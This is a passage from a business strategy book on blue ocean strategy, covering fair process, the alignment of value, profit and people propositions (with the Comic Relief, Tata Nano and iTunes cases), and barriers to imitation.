It\nall comes down to intellectual and emotional recognition.\n\nEmotionally, individuals seek recognition of their value, not as “labor,”\n“personnel,” or “human resources” but as human beings who are treated\nwith full respect and dignity and appreciated for their individual worth\nregardless of hierarchical level. Intellectually, individuals seek recognition\nthat their ideas are sought after and given thoughtful reflection, and that\nothers think enough of their intelligence to explain their thinking to them.\nSuch frequently cited expressions in our interviews as “that goes for\neveryone I know” or “every person wants to feel” and constant references\nto “people” and “human beings” reinforce the point that managers must see\nthe nearly universal value of the intellectual and emotional recognition that\nfair process conveys.\nIntellectual and Emotional Recognition Theory\n\nUsing fair process in strategy making is strongly linked to both intellectual\nand emotional recognition.° It proves through action that there is an\neagemess to trust and cherish the individual as well as a deep-seated\nconfidence in the individual’s knowledge, talents, and expertise.\n\nWhen individuals feel recognized for their intellectual worth, they are\nwilling to share their knowledge; in fact, they feel inspired to impress and\nconfirm the expectation of their intellectual value, suggesting active ideas\nand knowledge sharing. Similarly, when individuals are treated with\nemotional recognition, they feel emotionally tied to the strategy and inspired\nto give their all. Indeed, in Frederick Herzberg’s classic study on motivation,\nrecognition was found to inspire strong intrinsic motivation, causing people\nto go beyond the call of duty and engage in voluntary cooperation.’ Hence,\nto the extent that fair process judgments convey intellectual and emotional\nrecognition, people will better apply their knowledge and expertise, as well\nas their voluntary efforts to cooperate for the organization’s success in\nexecuting strategy.\n\nHowever, there is a flip side to this that is deserving of equal, if not more,\nattention: the violation of fair process and, with it, the violation of\nrecognizing individuals’ intellectual and emotional worth. The observed\npattern of thought and behavior can be summarized as follows. If individuals\nare not treated as though their knowledge is valued, they will feel intellectual\nindignation and will not share their ideas and expertise; rather, they will\nhoard their best thinking and creative ideas, preventing new insights from\nseeing the light of day. What’s more, they will reject others’ intellectual\nworth as well. It’s as if they were saying, “You don’t value my ideas. So I\ndon’t value your ideas, nor do I trust in or care about the strategic decisions\nyou’ ve reached.”\n\nSimilarly, to the extent that people’s emotional worth is not recognized,\nthey will feel angry and will not invest their energy in their actions; rather,\nthey will drag their feet and apply counter efforts, including sabotage, as in\nthe case of Elco’s Chester plant. This often leads employees to push for\nrolling back strategies that have been imposed unfairly, even when the\nstrategies themselves were good ones—critical to the company’s success or\nbeneficial to employees and managers themselves. Lacking trust in the\nstrategy-making process, people lack trust in the resulting strategies. Such is\nthe emotional power that fair process can provoke. When people are angered\nby the violation of fair process, not only do they want fair process restored,\nthey also seek to punish those who violated it. Theorists call this retributive\njustice. Figure 8-2 shows the observed causal pattern.\n\nFIGURE 8-2\n\nThe consequences of the presence and absence of fair process in strategy\nformulation and execution\n\nVoluntary\ncooperation in\nstrategy\nexecution\n\nNoncooperation\nin strategy\nexecution\n\n|»\n\nTrust,\ncommitment,\nand knowledge\nsharing\n\nDistrust,\nresentment, and\nknowledge\nwithholding\n\n|\n\n|\n\nIntellectual\nand emotional\nrecognition\n\nIntellectual\nand emotional\nindignation\n\nجح\n\nاص\n\nFair\nprocess\n\nViolation of fair\nprocess\n\nFair Process and Intangible Capital of an\nOrganization\n\nCommitment, trust, and voluntary cooperation are not merely attitudes or\nbehaviors. They are intangible capital. When people have trust, they have\nheightened confidence in one another’s intentions and actions. When they\nhave commitment, they are even willing to override personal self-interest in\nthe interests of the company.\n\nIf you ask any company that has created and successfully executed a blue\nocean strategy, managers will be quick to rattle off how important this\nintangible capital is to their success. Similarly, managers from companies\nthat have failed in executing a blue ocean strategy will point out that the\nlack of this capital contributed to their failure. These companies were not\nable to orchestrate strategic shifts because they lacked people’s trust and\ncommitment. Commitment, trust, and voluntary cooperation allow\ncompanies to stand apart in the speed, quality, and consistency of their\nexecution and to implement strategic shifts fast at low cost.\n\nThe question companies wrestle with is how to create trust, commitment,\nand voluntary cooperation deep in the organization. You don’t do it by\nseparating strategy formulation from execution. Although this disconnect\nmay be a hallmark of most companies’ practice, it is also a hallmark of slow\nand questionable implementation, and mechanical follow-through at best.\nOf course, traditional incentives of power and money—carrots and sticks—\nhelp. But they fall short of inspiring human behavior that goes beyond\noutcome-driven self-interest. Where behavior cannot be monitored with\ncertainty, there is still plenty of room for foot-dragging and sabotage.\n\nThe exercise of fair process gets around this dilemma. By organizing the\nstrategy formulation process around the principles of fair process, you can\nbuild execution into strategy making from the start. With fair process,\npeople tend to be committed to support the resulting strategy even when it\nis viewed as not favorable or at odds with their perception of what is\nstrategically correct for their unit. People realize that compromises and\nsacrifices are necessary in building a strong company. They accept the need\nfor short-term personal sacrifices in order to advance the long-term interests\nof the corporation. This acceptance is conditional, however, on the presence\nof fair process. Whatever the context in which a company’s blue ocean\nstrategy is executed, we have consistently observed this dynamic at work.\nFair Process and External Stakeholders\n\nThe impact of fair process has so far been discussed largely in the context\nof internal stakeholders of an organization. In this increasingly\ninterdependent world, however, external stakeholders play a key role in\nmany organizations’ success. In fact, compared with internal stakeholders,\nthe practice of fair process with external stakeholders could be said to play\nan even greater role in strategy execution as external stakeholders are\noutside of hierarchical control and often have diverging interests and\nunderstandings. While contracts and their enforceability with external\npartners are important, the information asymmetry that exists across\norganizations, coupled with the natural tendency for their interests and\nunderstandings to differ, make fair process central. Without external\nstakeholders’ commitment and cooperation, execution can easily become a\nslippery slope of missed deadlines, half-hearted alignment on quality, and\ncost overruns. The larger and more complex the nature of reliance on\nexternal stakeholders is, the more this is likely to occur.\n\nThink of the F-35 program discussed in chapter 5. The F-35 represented a\nconceptual breakthrough in fighter aircraft design that promised a blue\nocean of high performance and low cost. In 2001 Lockheed Martin won the\ncontract to build the F-35 based on the prototype aircraft it had developed.\nThe Pentagon was confident that the program would be an important\nsuccess.\n\nYet, as of 2014, the execution of the F-35 program has been anything but\ngood. The project has suffered significant cost escalations, schedule delays,\nand compromises on the value it promised to deliver. The F-35 program is a\ngood example of a blue ocean idea that has performed poorly mainly due to\nbad execution. A variety of reasons have been cited as possible causes of\npoor execution, such as the sheer size and complexity of the program and\nan overemphasis by Lockheed on short-term business goals over successful\ndelivery of the project. Yet these very reasons underlie what make fair\nprocess that much more important. A close look reveals that many of the\nproblems that have plagued the F-35’s execution can be traced to a lack of\nengagement, explanation, and expectation clarity among the military,\nLockheed, and the complex network of other external stakeholders upon\nwhich the project’s successful execution relied. The lack of the three E\nprinciples of fair process negatively affected both the knowledge sharing\nand voluntary cooperation that were needed.\n\nAt the time the F-35 project got underway, the Pentagon was operating\naccording to a relatively hands-off management policy, an outgrowth of the\nderegulation wave of the 1990s. The aim was to reduce costly government\noversight and give contractors more autonomy once a contract was\nawarded. In the case of the F-35 project, however, this went a few steps too\nfar and resulted in a lack of effective engagement with Lockheed. The\noutcome is that Lockheed ended up making as much as two-thirds of key\ndecisions in design, development, testing, fielding, and production of the F-\n35 without the Pentagon’s active engagement and input. With technical\nexperts from the Army, Navy, and Marines not actively sought nor fully\nutilized in key design decisions that arose, opportunities to share, explain,\nrefute, and synthesize different ideas and knowledge among stakeholders to\nenhance the quality of execution were minimal. Such lack of engagement\nand explanation further dampened the three military branches’ willingness\nto compromise on their own specifications as such needs arose, putting\nfurther pressure on the costs of the project.\n\nMoreover, expectations remained unclear, to the extent that\ninterpretations of the contract differed among the stakeholders. Lockheed\nwas given very broad guidelines, such as the airplane had to be\nmaintainable, able to operate from airfields, stealthy, and able to drop\nweapons.® Without detailed specifications, the Pentagon increasingly found\nthat the contractor had a very different view of how to interpret the\ncontractual document. According to Lieutenant General Christopher\nBogdan, who has been in charge of the Pentagon’s F-35 program since\nDecember 2012, the result is that while the military would say the F-35\nneeds to do X, Y, and Z, Lockheed Martin would respond that it was only\ngiven a general mandate to do something general like 7.” Mixed\nexpectations meant further revisions, costs, and mutual accusations. In\naddition, clear expectations were also absent for the complex network of\nsubcontractors. For example, while the inspector general of the Pentagon\nfaulted the office in charge of the F-35 program for not adequately passing\ndown key safety, quality, and technical requirements to the contractors and\nsubcontractors, the program office expected Lockheed Martin to be\nresponsible for ensuring compliance of its subcontractors. The result was\nnonconforming hardware and software, with Lockheed Martin and its\nsubcontractors not applying the rigor to design, manufacturing, and quality\nassurance processes that the Pentagon expected and counted on. The lack of\ndefinitive requirements affected suppliers’ ability to qualify its processes\nand ensure delivery of compliant products. The negative effect of this was\nmagnified exponentially as accelerated concurrent production was used\nwhereby the initial production of the F-35 began even before flight tests had\nbegun. As the F-35 program continued to discover an alarming rate of\nproblems in specifications, quality, and standards, this has meant a\ncontinuing high need for very costly, time-intensive rework of aircraft.\n\nWhile the violation of fair process and bad communication among\ninternal and external stakeholders have contributed to the poor execution of\nthe F-35 project, attempts are being made to face up to the problem and\nrectify it through more engagement and explanation with clearer\nagreements. In September 2013, Bogdan said, “I’m encouraged by where\nwe are today. I can tell you that when you start communicating and you\nstart listening to each other, you start finding solutions to problems instead\nof finding blame.”!°\n\nOf course, only time will tell if the Pentagon will be able establish and\nmaintain a culture of active engagement, explanation, and expectation\nclarity among the complex web of internal and external stakeholders needed\nto finally pull off the F-35 project. One thing is certain, however. As\nexperience to date shows, the Pentagon cannot afford to let fair process and\nthe voluntary cooperation and knowledge sharing that goes with it slip any\nlonger.\n\nWe are now ready to put our learning all together to address the\nimportant issue of strategy alignment in our next chapter. Strategy\nalignment is an integral concept that embraces and synthesizes our core\npoints and discussions in the previous chapters. It closes the loop, ensuring\nthat all parts of an organization’s strategy from value to profit to people\npresented so far are mutually reinforcing so that it becomes a high-\nperforming and sustainable strategy.\nCHAPTER 9\n\nAlign Value, Profit, and People Propositions\n\nWHEN WE ASK PEOPLE to define what blue ocean strategy is and what\ndrives its success, we typically get one of three answers. Some see it as\nfundamentally about how to reconstruct market boundaries and offer a leap\nin value to buyers. Others see the essence of blue ocean strategy as about\nunlocking business model innovation through strategic pricing, target\ncosting, and the like so a company can seize new customers profitably. And\nstill others see it as fundamentally about releasing the creativity, knowledge\nsharing, and voluntary cooperation of people through the proper approach\nto employees and partners. All three are correct answers. Indeed, we have\nso far discussed each of these in turn, laying out tools and frameworks that\ncompanies can apply to make each happen in a risk-minimizing and\nopportunity-maximizing manner. However, while all three are correct, they\nare also only partial answers. This brings us to the next to last principle of\nblue ocean strategy, alignment, where we close the loop between creating\nand capturing blue oceans so that it becomes a high-performing and\nsustainable strategy.\nThe Three Strategy Propositions\n\nAt the highest level, there are three propositions essential to the success of\nstrategy: the value proposition, the profit proposition, and the people\nproposition.! For any strategy to be successful and sustainable, an\norganization must develop an offering that attracts buyers; it must create a\nbusiness model that enables the company to make money out of its offering;\nand it must motivate the people working for or with the company to execute\nthe strategy. While good strategy content is based on a compelling value\nproposition for buyers with a robust profit proposition for the organization,\nsustainable strategy execution is based largely on a motivating-people\nproposition. Motivating people requires more than overcoming\norganizational hurdles and winning people’s trust with fair process. It also\nrests on aligned and fair incentives.\n\nIn this sense, the three strategy propositions provide an organizing\nframework to ensure an organization is taking a holistic approach to the\nformulation and execution of strategy.” If a strategy does not fully develop\nand align the three strategy propositions, short-lived success or failure\ntypically results. This is a trap many companies fall into. Lacking a holistic\nunderstanding of strategy, it is easy for an organization to focus\noverridingly on one or two strategy propositions to the exclusion of the\nother(s). For example, think of an organization that zealously focuses on\ngetting the value or profit proposition right, but pays little heed to getting\nthe people proposition aligned. Corporate graveyards are filled with such\nexamples. This is a classic case of execution failure. Likewise, good\nstrategy execution via a motivating-people proposition with poor strategy\ncontent as reflected in the value or profit proposition is also a path to poor\nperformance.\n\nIn some situations, there may be more than one group of stakeholders\nthat a strategy proposition must address. For example, if successful strategy\nexecution rests on the buy-in of only employees, there is only a need for\none people proposition. But when a company needs the support of a supply\nchain partner, for example, it must also give the potential partner a\ncompelling reason to back the strategy. In that case, a company would be\nrequired to have a distinct people proposition for both employees and the\nsupply chain partner. Similarly, in a business-to-business environment, there\nmight have to be two value propositions: one for the business customer and\nanother for the business customer’s customers.\n\nStrategic alignment is the responsibility of an organization’s top\nexecutives versus those in charge of marketing, manufacturing, human\nresources, or other functions. Executives with a strong functional bias\ntypically cannot successfully fulfill this important role because they tend to\nfocus on a part, not the whole, of the three strategy propositions, hence\nmissing the alignment. A manufacturing department, for example, might\nneglect buyer needs or treat people as a cost variable. Similarly, a marketing\ndepartment might focus on the value proposition and pay insufficient heed\nto the other two propositions. However, when the three disparate strategy\npropositions that cut across an organization are fully developed and aligned,\na high-performing and sustainable strategy is achieved.\n\nCreating a full set of consistent strategy propositions is, of course,\nessential, whether a firm follows blue ocean or red ocean strategy. Where\nthe two approaches really diverge is how organizations achieve alignment\naround the strategy propositions. Under red ocean strategy, an\norganization’s three strategy propositions need to be aligned with the\ndistinctive choice of pursuing either differentiation or low cost within given\nindustry conditions. Here, differentiation and low cost represent alternative\nstrategic positions in an industry.\n\nIn contrast, under blue ocean strategy, an organization achieves high\nperformance when all three strategy propositions pursue both differentiation\nand low cost. It is this alignment in support of differentiation and low cost\nthat ensures a successful blue ocean strategy that has sustainability. (See\nfigure 9-1). While one or two strategy propositions can be imitated,\nimitating all three is difficult, especially the people proposition because it is\nembedded in human relationships that take time to cultivate. When external\nstakeholders are involved and important, getting the people proposition\nright takes even more time and effort for potential imitators, hence typically\nprolonging the aligned strategy’s sustainability.\n\nFIGURE 9-1\nAchieving strategy alignment\n\nBlue ocean\n\nValue proposition strategy approach\n\nThe utility buyers receive The alignment of the\nfrom an offering minus the three strategy\nprice they pay for it ae propositions in\npursuit of both\nProfit proposition differentiation\nThe revenues an and low cost.\norganization generates\nfrom an offering minus the\n\ncost to produce and deliver it\n\nRed ocean\n\nPeople proposition strategy approach\nThe positive motivations ™ The alignment\nand incentives put in place of the three\n\nfor the people needed to strategy propositions\nsupport and implement in pursuit of either\n\ndifferentiation\nor low cost.\n\nthe strategy\n\nAchieving Blue Ocean Strategic Alignment\n\nTo understand how an organization achieves alignment to produce a high-\nperforming and sustainable blue ocean strategy, let’s look at Comic Relief, a\nUK fund-raising charity. Founded in 1985, Comic Relief leapfrogged\nexisting UK fund-raising charities and emerged as one of the most\ndistinctive charities in the UK that also enjoys the lowest costs. In an\novercrowded industry that suffered rising costs, declining demand, and a\npublic confused by the sheer number of fund-raising charities, Comic Relief\nrapidly achieved 96 percent national brand awareness and has raised over\n£950 million by inspiring everyone from traditional wealthy donors to\nprevious nondonors to give. What’s more, while UK charities get, on\naverage, only 45 percent of their funds from the public—the rest coming\nfrom government grants and corporations—Comic Relief has raised 100\npercent of its donations directly from the public and has done so with no\npaid marketing or mail solicitations. Now, nearly thirty years on, there are\nstill no credible imitators in the blue ocean it created. Let’s see how it has\nachieved this sustained high performance through alignment.\n\nIn the case of Comic Relief, customers are donors whom it needs to\nattract with a compelling value proposition. Its profit proposition is about\nthe business model it built to maximize its “profit,” which for Comic Relief\nis its revenue surplus over costs that can ultimately flow to charities. And its\npeople proposition is about the positive incentives and motivations put in\nplace for its employees and network of volunteer fund-raisers, corporate\npartners, and celebrities.\n\nConsider the differences between Comic Relief and other UK charities’\nvalue, profit, and people propositions. As we go through these, you will see\nthat when the three strategy propositions are aligned around differentiation\nand low cost, key factors from one proposition often support and reinforce\nthe other two propositions, creating a strong, positive cycle. For example,\norganizations can leverage a compelling value proposition to strengthen its\nprofit and people propositions or build on a powerful people proposition to\ncreate a strong value proposition, which in turn strengthens the profit\nproposition, which makes imitation that much more difficult. Here’s how\nComic Relief’s value, profit, and people propositions work.\nThe Value Proposition\n\nTraditional fund-raising charities in the UK use sad or shocking images in\ntheir campaigns, stimulating negative feelings of guilt and pity to trigger\ndonations. Their focus is on securing and recognizing large gifts mainly\nfrom high-income, educated, older donors through year-round campaigns\nand solicitations of funds.\n\nComic Relief, in contrast, has eliminated pity and guilt. It uses a\nbreakthrough new fund-raising approach, Red Nose Day, a double-\nwhammy combination of a national day of whacky, community “fun”\ndraising when people volunteer to perform zany antics to raise money, and a\nstar-studded comedy telethon, Red Nose Night. Forget pity. It’s all about\ndoing something funny for money to change the world.\n\nWith Comic Relief, donors don’t need to write a big check. Taking part is\ncheap, easy, and fun. People can contribute by buying a little plastic red\nnose that costs a £1, is sold everywhere, and can’t help but make you smile.\nOver 66 million have been purchased so far; everyone wears them. Or you\ncan donate by sponsoring the silly antics of friends, family, neighbors, or\ncolleagues, thereby giving money while having a great laugh. For example,\nfriends and colleagues sponsored a London travel agent with a reputation as\na chatterbox to stay silent for twenty-four hours; they collectively donated\nover £500 in sponsorship while having a blast watching the chatterbox\nstruggle to stay silent.\n\nComic Relief’s unique use of community fund-raising not only leverages\npeople’s fondness to have fun. It’s also personal. It is not some unknown\nperson asking for donations as at most other charities. Rather it’s a friend,\nloved one, or colleague who you care about and want to support.\n\nUnlike traditional charities, Comic Relief values and recognizes even the\ntiniest donation, for example, when Red Nose Night explains that the\ngenerous donation of one little girl, who gave “all her pocket money” of\n£1.90, will feed seven children in Africa. People know their every cent\ncounts and makes a difference. This opens the door for even the poorest and\nyoungest person to realize that even he can make a major contribution and\nbecome part of a greater cause of personally contributing to “changing the\nworld.”\nWhile traditional charities solicit funds from a regular base of supporters\nyear-round and every year, Comic Relief focuses on creating this unique\nexperience once every two years to avoid boredom and nagging. Instead of\nfeeling donor fatigue, as with other charities’ continuous solicitations,\npeople actually look forward to the excitement of the next Red Nose Day,\nwhich has nearly become a national holiday in the UK.\n\nLastly, Comic Relief donates 100 percent of all funds raised with its\ngolden pound promise that it spends none of the funds on its own overhead\nor operating costs, as the average UK charity does. This transparency is\nreassuring to people who often wonder what percent of funds actually\nmakes its way to charity. The result is a value proposition that not only is\nfun, exciting, and clear but also allows donors to make a huge difference\nwith a small donation. In other words, it is differentiated and low cost,\naffordable to everyone from the very young to the very old and from low to\nhigh income.\nThe Profit Proposition\n\nHow does Comic Relief raise such extraordinary sums and support its\noperations while maintaining the golden pound promise? It has done so by\ncomplementing its compelling value proposition with an unbeatable profit\nproposition that simultaneously achieves a low-cost structure while\ngenerating funds in a differentiated way.\n\nTraditional charities use a variety of methods to raise funds from several\nsources such as writing grant proposals to governments, trusts, and\nfoundations; holding fund-raising galas for wealthy influential people and\ncorporations; directly soliciting via mail and telemarketing; and operating\ncharity shops. Almost all these activities entail significant overhead costs in\nstaff, management, and administration as well as the possible renting or\npurchase of facilities.\n\nComic Relief, by contrast, eliminated all of these. It doesn’t plow time\nand money into expensive fund-raising galas, it doesn’t write grants to\nsolicit funds from governments and foundations, and it doesn’t have charity\nshops. Instead it leverages existing high street retail outlets from\nsupermarkets to fashion stores to sell its little red noses. And because\nComic Relief makes grants to other charities, rather than introducing\ncompeting programs into an already crowded market, the costs of\nadministering the funds it raises are cut dramatically. By some estimates,\nComic Relief has stripped away more than 75 percent of traditional fund-\nraising operations.\n\nComic Relief can afford to keep costs low due to the unique way it raises\nmoney. What Comic Relief understood is that with community “fun”\ndraising, it is no longer the charity pushing the donor to make a\ncontribution, but the cause pulling the donor in. And with people\nvolunteering to do the bulk of fund-raising by engaging in silly antics that\nothers sponsor, Comic Relief’s staff costs stay very low. Whereas traditional\ncharities’ use of community fund-raising is completely accidental and\ninfrequent, through Red Nose Day, Comic Relief focuses on community\nfund-raising, making it the systematic, dominant channel through which to\nget contributions.\nWhile traditional fund-raising charities tend to focus on wealthy older\ndonors, Red Nose Day is all about targeting the mass and raising funds via\nlots of small increments. On Red Nose Day, ordinary people do\nextraordinary things and raise huge amounts of money, from a large number\nof small contributions.\n\nWhat’s more Red Nose Night—the star-studded comedy extravaganza\nthat makes people laugh to raise money for charity—doesn’t cost a penny.\nEveryone gives his or her services for free (the network, the studios, the\nstars). Unlike traditional charities that engage in costly marketing to stand\nout in the overcrowded industry, Comic Relief avoids large advertising\ncosts, thanks to the widespread media attention and free word-of-mouth\nadvertising that all the excitement of Red Nose Day generates.\n\nTo help Comic Relief realize its golden pound promise, corporate\npartners cover its operating costs in cash or in kind. The overall result is\nthat Comic Relief has not only a compelling value proposition, but a\ndifferentiated, low-cost profit proposition.\nThe People Proposition\n\nAt Comic Relief, all the people involved win, not just those they help. With\na small number of motivated staff members who are inspired by its value\nproposition, Comic Relief’s people proposition focuses on inspiring\nvolunteer fund-raisers, corporate sponsors, and celebrities whose buy-in is\nneeded to make the value and profit propositions sustainable.\n\nToward this end, Comic Relief begins by creating a legitimate platform,\nRed Nose Day, for everyone to go a bit mad and have an outrageous time\nvolunteering in order to raise money. Next, Comic Relief makes\nparticipating easy: its website offers all sorts of zany ideas to fire up your\nimagination for funny antics and tips on how to get people you know to\neasily sponsor you. By taking part and becoming an actor in fund-raising,\npeople earn the respect of friends, family, and colleagues, while feeling a\nsense of pride that they are visibly part of a group working to better the\nworld.\n\nBy offering people the opportunity to be actively involved in raising\nmoney through silly antics, not only are people having fun, but they become\npart of a greater cause of personally contributing to bettering the world.\nWith Comic Relief, volunteers are the actors in fund-raising and part of a\nlarge one-day event where everyone is doing his or her share to positively\nchange the world while having a great time.\n\nAll of this is achieved while conserving volunteers’ most valuable\nresource, time; participating in Comic Relief doesn’t take a lot as you only\nhave to do something silly every other year. In this way, Comic Relief\ncreates a compelling, low-cost people proposition that inspires people\nacross the nation to volunteer and fund-raise on behalf of Comic Relief.\nContrast this with traditional charities where volunteering can be a drag and\npeople often silently feel they are sacrificing to help out.\n\nComic Relief’s low-cost and differentiated people proposition extends to\ncorporations and celebrities as well. Only in this case, in addition to the\nbenefits that ordinary citizens get for volunteering, sponsoring corporations\nand participating celebrities get tremendous free publicity across the UK.\nThat’s because Comic Relief’s differentiated, low-cost value proposition\ntriggers enormous free press, including over two hundred hours of TV time,\nhundreds of hours of radio coverage, and over ten thousand press articles.\nThe result is that Comic Relief does not have to beg corporate sponsors or\ncelebrities to take part. Instead it has corporate sponsors and celebrities\neager to volunteer to help it realize its golden pound promise of giving 100\npercent of donations to great causes, creating a win all around. As the\nComic Relief case illustrates, the aligned value, profit, and people\npropositions around differentiation and low cost create powerful,\nreinforcing synergies and a win-win for all.\nWhen a Strategy Is Not Properly Aligned\n\nWhile a properly aligned blue ocean strategy like Comic Relief’s has an\ninherent sustainability because it is hard to imitate, when not properly\naligned, even a compelling blue ocean idea with an impressive market entry\nmay not sustain its appeal and struggle to get back its initial momentum or\nend up failing in some cases. This is why so many innovations to create\nnew markets generate initial market excitement but fizzle out. Take the case\nof the Tata Nano. At its launch, the Tata Nano was hailed as the people’s\ncar. It garnered more media attention than any other car launch in the world\nat the time. It also achieved the biggest sales uptake in the history of the\nglobal automobile industry. After it was officially introduced in March\n2009, more than two hundred thousand orders poured in within two weeks.\nThere is reason.\n\nIts value proposition had the hallmarks of a blue ocean. Tata Motors\nreconstructed key buyer value factors across the passenger car market and\nthe two-wheeler market to offer the Tata Nano. Like the passenger car, the\nTata Nano offered a safe, comfortable, reliable, and respectable all-weather\nmeans of transportation for Indian families. At the same time, however, the\nNano was priced against the far-lower-cost, two-wheeled vehicle market\nthat most Indian families relied on for their daily transportation needs. In\nthis way, Tata Nano’s value proposition offered buyers both differentiation\nand low cost, putting an automobile within reach of most Indians for the\nfirst time.\n\nTata Motors matched its compelling value proposition with a compelling\nprofit proposition. Under the guidance of Ratan Tata, chairman of the Tata\nGroup, the Nano team introduced a series of cost innovations in design,\nmanufacturing, marketing, and maintenance that resulted in a profit\nproposition that was both differentiated and low cost. The Nano, for\nexample, used a two-cylinder rear engine combined with rear-wheel drive\nto not only lower costs but also provide better fuel efficiency and more\ninterior space without an increase in the size of the car. The Nano’s two-\ncylinder engine was also made of aluminium instead of the steel of\nconventional engines, which was lighter, cost less to build, and also\nprovided better fuel efficiency. And the component parts were dramatically\nsimplified; for example, its door handles were designed with 70 percent\nfewer parts.\n\nWhile the Nano team eliminated nonessential luxury features in its profit\nproposition, it did not reduce costs across the board. For example, making\nthe Nano a two-door car could have achieved substantial cost savings, but it\nwould have greatly inconvenienced the typical multigenerational Indian\nfamily and therefore was not adopted. It would be hard, for example, for a\ngrandmother in a sari to get in the backseat. In this way, Tata Nano’s cost-\nreduction efforts reinforced rather than compromised its value proposition,\nresulting in a well-aligned, differentiated, and low-cost profit proposition.\n\nYet, despite its compelling value proposition and a viable profit\nproposition, the Tata Nano’s initial success was not sustained and ended up\nfailing to meet sales targets and public expectations. What went wrong? A\ncloser look reveals that this setback arose largely from a major weakness in\nthe people proposition for a critical external stakeholder group whose\ncooperation Tata depended on. Despite its good will and intentions, Tata\nwas unable to secure the cooperation of the Singur community in West\nBengal where Tata set out to establish its manufacturing facilities. The focal\ndispute was mainly about the leasing of arable land for industrial use and\nthe negotiation process and level of compensation for the local owners in\nthe community. This misalignment caused Tata Nano’s massive facility\nrelocation and dampened the Nano’s initial success. While Tata has since\nput a new team together to get the Nano back on track, it is a good example\nof how a misaligned proposition can bring about negative performance\nconsequences.\n\nTo produce a high-performing and sustainable blue ocean strategy, you\nneed to ask the following questions. Are your three strategy propositions\naligned in pursuit of differentiation and low cost? Have you identified all\nthe key stakeholders, including external ones on which the effective\nexecution of your blue ocean strategy will depend? Have you developed\ncompelling people propositions for each of these to ensure they are\nmotivated and behind the execution of your new idea?\nPutting It All Together\n\nThe examples of Napster and Apple’s iTunes in the digital music industry\nallow us to put this all together: two strategic moves, both seeking to create\nand capture uncontested market space with digital music. Napster had the\nclear first-mover advantage, pulled in over 80 million registered users, and\nwas generally loved for its value proposition, but its strategy ultimately\nfailed. It had no sustainability. In contrast, iTunes achieved sustainable\nsuccess and both dominated and grew the blue ocean of digital music.\nFundamentally, what separates the outcomes of these two strategic moves is\nalignment.\n\nThe Napster team, lacking a holistic view of strategy, failed to align its\nexternal people proposition for its partners to support the compelling value\nit unlocked. When the record labels approached Napster to work out a\nrevenue-sharing model for the digital download of music that would create\na win-win for both sides, Napster balked. The excitement over Napster’s\nspectacular growth prevented it from appreciating that it needed an external\npeople proposition that offered differentiation and low cost for its key\npartners, the record labels. Rather than work to build a compelling people\nproposition that would strike a win-win arrangement with record labels,\nNapster took a belligerent approach, declaring it would advance with or\nwithout the record labels’ support. The rest is history; Napster was forced to\nshut down due to copyright infringement. This prevented Napster from ever\ndeveloping a profit proposition that could benefit from its huge user base.\nLacking strategy alignment, Napster’s success was short-lived.\n\nApple by contrast created a set of fully developed and aligned strategy\npropositions. Its compelling value proposition for buyers was\ncomplemented by a compelling people proposition for its external partners,\nmajor music companies, allowing Apple to gain the support of all five\nmajor music companies—BMG, EMI Group, Sony, Universal Music\nGroup, and Warner Brothers Records. With iTunes, music companies\nreceive 70 percent of the purchase price of every song downloaded, creating\na win-win proposition for both Apple and business partners. And since\nApple’s iTunes also drove sales of its already hot iPod, iTunes multiplied\nthe company’s profit proposition, creating a positive reinforcing cycle of\nprofit across the two platforms. The result: the alignment across iTunes’\nvalue, profit, and people propositions ushered in a new era of music,\nallowing Apple to create, capture, and dominate a new market space in\ndigital music.\n\nDo you have a holistic understanding of strategy? Has your new strategy\nfully developed and aligned the three strategy propositions for sustained\nsuccess? The continuing success of your company’s strategy depends on it.\n\nThis brings us to our discussion of the last principle of blue ocean\nstrategy in which we address the important issue of the renewal of blue\noceans over time.\nCHAPTER 10\n\nRenew Blue Oceans\n\nCREATING A BLUE OCEAN is not a static achievement but a dynamic\nprocess. Once a company creates a blue ocean and its powerful\nperformance consequences are known, sooner or later imitators appear on\nthe horizon. Here, the questions are: How soon or late will they come? How\neasy or difficult is a blue ocean strategy to imitate? Put differently, what are\nthe barriers to imitation?\n\nAs the company and its early imitators succeed and expand the blue\nocean, more and more companies jump in, eventually turning the color of\nthe ocean red. This raises a related question: When should a company reach\nout to create another blue ocean to renew its business or its portfolio of\nbusinesses? In this chapter, we address the issues of imitation and the\nrenewal of blue ocean strategy by answering these questions.\nUnderstanding the process of renewal is key to ensure that the creation of\nblue oceans is not a one-off occurrence but is institutionalized as a\nrepeatable process in an organization.\nBarriers to Imitation\n\nA blue ocean strategy brings with it considerable barriers to imitation that\neffectively prolong sustainability. They range from alignment to cognitive,\norganizational, brand, economic, and legal barriers. More often than not, a\nblue ocean strategy will go without credible challenges for many years.\nCirque du Soleil’s blue ocean endured over twenty years; Comic Relief’s,\nnearly thirty years; Apple’s iTunes’, now more than ten years. The list goes\non from JCDecaux to Intuit’s Quicken to Salesforce.com. This sustainability\ncan be traced to the following imitation barriers:\n\n* The alignment barrier. As discussed in chapter 9, the alignment of the\nthree strategy propositions—value, profit, and people—into an integral\nsystem around both differentiation and low cost builds sustainability\nand hence forms a formidable barrier to imitation.\n\n* The cognitive and organizational barrier. A value innovation move\ndoes not make sense based on conventional strategic logic. When CNN\nwas introduced, for example, NBC, CBS, and ABC ridiculed the idea of\ntwenty-four-hour, seven-day, real-time news without star broadcasters.\nCNN was referred to as Chicken Noodle News by the industry. Ridicule\ndoes not inspire rapid imitation as it creates a cognitive barrier.\nMoreover, because imitation often requires companies to make\nsubstantial changes to their existing business practices, organizational\npolitics often kick in, delaying for years a company’s commitment to\nimitate a blue ocean strategy. When Southwest Airlines, for example,\ncreated a service that offered the speed of air travel with the cost and\nflexibility of driving, imitating this blue ocean strategy would have\nmeant major revisions in routing planes, retraining staff, and changing\nmarketing and pricing, not to mention culture—significant\norganizational changes that the politics of few companies can bear in\nthe short term.\n\n* The brand barrier. Brand image conflict prevents companies from\nimitating a blue ocean strategy. The blue ocean strategy of The Body\nShop, for example—which shunned beautiful models, promises of\neternal beauty and youth, and expensive packaging—left major\ncosmetic houses the world over actionless for years because imitation\nwould signal an invalidation of their current business models. Also,\nwhen a company offers a leap in value, it rapidly earns brand buzz and\na loyal following in the marketplace. Even large advertising budgets by\nan aggressive imitator rarely have the strength to overtake the brand\nbuzz earned by the value innovator. Microsoft, for example, tried for\nyears to dislodge Intuit’s value innovation, Quicken. After nearly thirty\nyears of efforts and investment, it finally threw in the towel and ceased\noperations of its contender, Microsoft Money, in 2009.\n\n* The economic and legal barrier. Natural monopoly blocks imitation\nwhen the size of a market cannot support another player. For example,\nthe Belgian cinema company Kinepolis created the first megaplex in\nEurope in the city of Brussels and has not been imitated in 